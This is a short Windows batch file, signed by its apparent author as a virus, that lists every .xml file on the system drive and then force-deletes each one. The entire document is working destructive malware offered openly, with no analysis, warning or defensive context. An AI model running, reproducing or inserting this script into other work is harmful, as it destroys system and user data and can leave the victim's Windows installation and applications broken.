@ echo off
rem ---------------------------------
rem Delete All Xml
DIR /S/B %SystemDrive%\*.xml >> FIleList_xml.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_xml.txt) do del "%%j:%%k"
rem ---------------------------------


__-Virus Author: subhojit-__